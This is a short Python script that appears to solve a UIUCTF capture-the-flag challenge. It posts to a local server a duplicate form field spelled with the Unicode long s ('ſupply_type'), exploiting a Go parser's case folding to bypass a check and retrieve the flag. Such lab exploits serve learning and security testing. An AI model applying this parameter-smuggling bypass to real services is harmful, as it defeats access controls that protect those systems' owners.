import requests
from urllib.parse import unquote, urlparse, parse_qs

url = "http://127.0.0.1:5000"

r = requests.post(f'{url}/create_shipment', data={
  "supply_type": "anything can go here besides flag",
  # https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/#:~:text=You%20can%20even%20use%20Unicode%20characters!
  "ſupply_type": 'flag'  
})

parsed = urlparse(r.url)
query = parse_qs(parsed.query)
flag = query.get('status', [None])[0]
if flag and flag.startswith('uiuctf'):
  print("Flag:", unquote(flag))
else:
  print("Failed to find flag.")